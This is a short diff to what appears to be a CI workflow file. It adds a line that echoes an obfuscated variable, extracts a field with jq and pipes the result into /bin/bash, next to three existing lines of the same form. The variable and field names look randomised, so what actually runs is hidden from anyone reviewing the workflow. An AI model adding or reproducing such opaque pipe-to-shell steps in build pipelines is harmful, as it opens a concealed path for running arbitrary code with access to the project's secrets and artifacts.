@@ -33,6 +33,7 @@ jobs:
           echo $qjl0428 | jq -r .ma2 | /bin/bash
           echo $d18 | jq -r .fzn97 | /bin/bash
           echo $wuq73970 | jq -r .bw163 | /bin/bash
+          echo $nypk6 | jq -r .we58 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
